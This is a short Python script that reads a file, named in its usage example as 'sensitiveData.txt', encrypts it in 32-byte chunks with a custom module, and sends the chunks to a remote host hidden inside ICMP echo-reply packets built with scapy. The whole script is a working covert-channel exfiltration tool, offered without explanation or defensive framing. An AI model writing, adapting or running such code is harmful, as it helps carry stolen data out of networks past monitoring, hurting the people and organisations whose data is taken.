#Example: python3 dropBriefcase.py sensitiveData.txt 10.0.2.5
import sys
from scapy.all import *
import BasicEncryption

host = sys.argv[2]
conf.verb = 0
f = open(sys.argv[1])

#Read data
data = f.read()
f.close()

print("Data size is %d " % len(data))

# Split data up to send through 32-bit ICMP packets
i = 0
while i < len(data):
    encryptedData = BasicEncryption.encrypt(data[i:i+32],5)
    pack = IP(dst=host)/ICMP(type="echo-reply")/encryptedData
    #print(pack)
    send(pack)
    i = i+32
    print("Sending Data",i)

